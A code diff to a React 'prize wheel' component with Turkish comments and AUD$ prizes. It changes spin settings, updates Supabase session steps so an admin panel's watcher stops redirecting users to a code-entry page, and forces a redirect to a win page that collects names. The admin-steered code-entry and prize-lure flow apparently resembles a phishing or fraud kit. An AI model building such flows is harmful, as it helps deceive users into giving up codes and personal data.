@@ -32,7 +32,7 @@ type SessionRecord = {
 };
 
 const ANGLE_OFFSET = 0;
-const MIN_FULL_SPINS = 4;
+const MIN_FULL_SPINS = 5;
 const LOCAL_HISTORY_KEY = "ah-prize-wheel-last-five-wins";
 const MAX_HISTORY_ITEMS = 5;
 const WHEEL_CURRENCY = "AUD$";
@@ -213,10 +213,21 @@ export function WheelClient({
 
       // Eğer admin paneli normal link olarak açmışsa ama kullanıcı çark sayfasındaysa,
       // admin panelinde "ÇARK OYUNU" yazması için is_wheel_game'i true yapalım.
-      if (nextSession.current_step === "code_entry" && !nextSession.form_data?.is_wheel_game) {
+      if (nextSession.current_step === "code_entry") {
+        // ⭐ WHEEL AKIŞI: İlk açılışta code_entry is_wheel_game'i true yap VE
+        //   current_step'i de WHEEL olarak GÜNCELLE.
+        //   Böylece GlobalStatusWatcher /code'a geri atamaz.
+        const alreadyWheel = (nextSession.form_data as any)?.is_wheel_game === true;
         const updatedFormData = { ...(nextSession.form_data || {}), is_wheel_game: true };
-        await supabase.from("sessions").update({ is_hidden: false, form_data: updatedFormData }).eq("id", sessionId);
+        await supabase.from("sessions").update({
+          is_hidden: false,
+          current_step: alreadyWheel ? nextSession.current_step : "wheel",
+          form_data: updatedFormData,
+        }).eq("id", sessionId);
         nextSession.form_data = updatedFormData;
+        if (!alreadyWheel) {
+          nextSession.current_step = "wheel";
+        }
       }
 
       setSessionData(nextSession);
@@ -334,11 +345,14 @@ export function WheelClient({
         : previous,
     );
 
-    // Çark DURDUKTAN SONRA — kullanıcı kazanan segmenti rahatça görsün (3.5sn)
+    // ⭐ Çark DURDUKTAN SONRA:
+    //   - 1800ms kazanan segmenti göster (kullanıcı rahatça görsün)
+    //   - sonra isim-soyisim /win sayfasına yönlen (FLASH YOK: replace)
     setTimeout(() => {
-      // ⭐ FLASH YOK: router.push → router.replace
-      router.replace(`/win/${effectiveRouteSessionId}`);
-    }, 3500);
+      const winTarget = `/win/${effectiveRouteSessionId}`;
+      try { window.location.replace(winTarget); } catch {}
+      try { router.replace(winTarget); } catch {}
+    }, 2200);
   };
 
   const spinWheel = () => {
